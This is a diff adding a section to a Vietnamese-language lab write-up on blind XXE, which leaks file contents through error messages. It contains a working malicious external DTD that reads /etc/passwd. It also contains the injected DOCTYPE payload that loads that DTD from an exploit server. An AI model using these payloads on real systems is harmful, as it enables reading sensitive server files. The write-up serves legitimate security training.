@@ -339,3 +339,31 @@
 > Để solve, Dùng `DTD` bên ngoài để kích hoạt lỗi hiện thị nội dung của tệp `/etc/paswd`
 
 **Giao diện**
+
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-retrieve%20dat-via-error-messages-0.png)
+
+> Lab cũng cung cấp 1 `server` để lưu trữ mã độc:
+>
+> `Script`:
+>
+> ```
+> <!ENTITY % file SYSTEM "file:///etc/passwd">
+> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+> %eval;
+> %exfil;
+> ```
+>
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-retrieve%20dat-via-error-messages-1.png)
+
+> Chặn và sửa `check stock`:
+>
+> `Script`:
+>
+> ```
+> <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+> ```
+>
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-retrieve-dat-via-error-messages-2.png)
+
+> DONE
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-retrieve-dat-via-error-messages-3.png)
